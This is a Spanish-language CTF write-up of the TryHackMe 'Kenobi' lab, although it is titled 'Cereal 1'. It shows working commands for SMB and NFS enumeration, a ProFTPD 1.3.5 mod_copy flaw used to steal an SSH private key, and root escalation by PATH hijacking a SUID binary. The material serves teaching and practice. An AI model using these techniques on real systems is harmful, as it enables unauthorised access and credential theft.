---
layout: single
title: Cereal 1 - TryHackMe
excerpt: " This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary."
date: 2023-03-21
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-kenobi/kenobi.png
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:
  - Samba
  - RPC
  - NFS
  - smbmap
  - Path Hijacking
  - SSH
---

This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.
<br><br>
# Summary
- IP: 10.10.71.110
- OS: Linux
- Services & Applications:

```js
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
33859/tcp open  mountd      1-3 (RPC #100005)
36763/tcp open  nlockmgr    1-4 (RPC #100021)
50123/tcp open  mountd      1-3 (RPC #100005)
54537/tcp open  mountd      1-3 (RPC #100005)
```

# Recon

- Escaneo básico de puertos:  

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.71.110 -oG allPorts
```


- Escaneo profundo de puertos encontrados:  

```bash
$nmap -p21,22,80,111,139,445,2049,33859,36763,50123,54537 -sCV 10.10.71.110 -oN targeted
```

<br><br>
# Análisis de protocolo SMB (Port 445):

- Con "smbmap" verificamos con una sesión de invitado posibles `recursos compartidos` en la red que nos puedan resultar útil.

```bash
$smbmap -H 10.10.71.110
```

```js
[+] Guest session   	IP: 10.10.71.110:445	Name: 10.10.71.110                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	anonymous                                         	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (kenobi server (Samba, Ubuntu))
```

- Podemos ver un directorio "anonymous" con permisos de lectura; revisamos que hay dentro de este directorio:

```bash
$smbmap -H 10.10.71.110 -R anonymous
```

```js
[+] Guest session   	IP: 10.10.71.110:445	Name: 10.10.71.110                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	anonymous                                         	READ ONLY	
	.\anonymous\*
	dr--r--r--                0 Wed Sep  4 05:49:09 2019	.
	dr--r--r--                0 Wed Sep  4 05:56:07 2019	..
	fr--r--r--            12237 Wed Sep  4 05:49:09 2019	log.txt
```

- Vemos un archivo "log.txt", lo descargamos a nuestra máquina atacante y lo leemos:

```bash
$smbmap -H 10.10.71.110 --download anonymous/log.txt
```

```js
[+] Starting download: anonymous\log.txt (12237 bytes)
[+] File output to: /home/dante/Tryhackme/Kenobi/content/10.10.71.110-anonymous_log.txt
```


```bash
$cat 10.10.71.110-anonymous_log.txt
```

- Al leer vemos la siguiente linea:

```js
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa):
```


- Podemos deducir que se trata de un log sobre la creación de una `"id_rsa"` para el usuario "kenobi".

<br><br>
# Análisis de servicio NFS (Port 2049):


- Como habíamos visto el puerto 2049, podemos aplicar un análisis de recursos `montados` en el sistema haciendo uso del servicio NFS; para ver que recursos tiene disponible el sistema víctima para montar, usamos el siguiente comando:

```bash
$showmount -e 10.10.71.110
```

```js
Export list for 10.10.71.110:
/var *
```

- Como vemos, todos los recursos del directorio "/var" del sistema víctima se encuentran disponibles para ser montados con el protocolo `NFS`; para montarlos en nuestras máquina atacante podemos usar el siguiente modelo:

```bash
mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
```

- Adecuándolo a nuestro caso quedaría más o menos así:

```bash
$mount -t nfs 10.10.71.110:/var web -o nolock
```

- Hecho esto, podremos visualizar todos los recursos en tiempo real del directorio `"/var"` de la máquina víctima; si analizamos todo este directorio no encontraremos algún vector de ataque, por ahora, que nos ayude a ganar acceso al sistema, así que seguimos enumerando.
<br><br>
# Explotación de servicio proftpd 1.3.5 (Port 21):

- En la fase de reconocimiento pudimos obtener la versión del servicio `Proftpd` que está corriendo en el puerto 21, bucamos vulnerabilidades para esta versión:

```bash
$searchsploit proftpd 1.3.5
```

```js
ProFTPd 1.3.5 - File Copy                         | linux/remote/36742.txt
```

- Analizamos en qué consiste esta exploit y podemos concluir que esta versión de proftpd permite `copiar y pegar` archivos dentro del sistema sin autenticación alguna.

- Para esto, iniciamos sesión FTP con crendeciales incorrectas, y cuando estemos en la linea de comandos `FTP`, podemos usar los comandos "site cpfr ubicación" y "site cpto ubicación" para copiar y pegar archivos del sistema víctima respectivamente.

- Como habíamos visto con anterioridad, existe la posibilidad de que la "id_rsa" del usuario `"kenobi"` se encuentre creada, y además, como nos aprovechamos del servicio `NFS` y tenemos acceso al directorio "var" del sistema, lo que podemos hacer es copiar el archivo "id_rsa" del usuario "kenobi" y pegarlo en un directorio con permisos de escritura dentro de "/var" el cual, por defecto suele ser "/tmp":

```
ftp> site cpfr /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
ftp> site cpto /var/tmp/id_rsa
250 Copy successful
```

- Hecho esto podremos leer el archivo `"id_rsa"` que hemos copiado en el directorio "/var/tmp".

- Copiamos el contenido de este archivo, lo pegamos en un archivo del mismo nombre dentro de nuesta máquina atacante, le damos permisos de ejecución y lo usamos para acceder al sistema como el usuario "kenobi" sin contraseña:

```bash
$nano id_rsa
$chmod 600 id_rsa
$ssh -i id_rsa kenobi@10.10.71.110
```

<br><br>

# ESCALANDO PRIVILEGIOS:

# Path Hijacking Privilege Escalation:

- Buscamos binarios con permisos `SUID`:

```bash
$find / -perm -4000 2>/dev/null
```

```js
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

- Vemos un binario poco común `"/usr/bin/menu"` el cual tiene como propietario a "root", lo ejecutamos para ver en que consiste y vemos que se nos despliega un menú con 3 opciones, si elegimos la primera vemos que en el output nos muestra la respuesta de la cabecera de una petición hecha con "curl".

- Si analizamos este binario con `"strings"` podemos confirmar que está ejecutando el comando "curl", y lo hace usando la ruta `relativa`, es decir, no está especificando la ruta absoluta del comando curl, sino que este busca a partir del PATH la ubicación de "curl" para posteriormente ejecutarlo.

- Podemos aprovecharnos de esto aplicando un `PATH HIJACKING`, para que nos tome el comando `curl` a un archivo creado por nosotros y lo ejecute como "root" (ya que el binario tiene permisos SUID y el propietario es root):


```bash
$ touch /tmp/curl
$ chmod +x /tmp/curl 
$ echo "chmod u+s /bin/bash" > /tmp/curl 
$ export PATH=/tmp:$PATH
```

- Hecho esto solo resta ejecutar el binario y elegir la opción 1 para que ejecute el comando curl que hemos creado y otorgue permisos SUID a la bash.

- Ejecutamos la bash con privilegios y seremos root y podremos leer las flags.

```bash
$bash -p
```
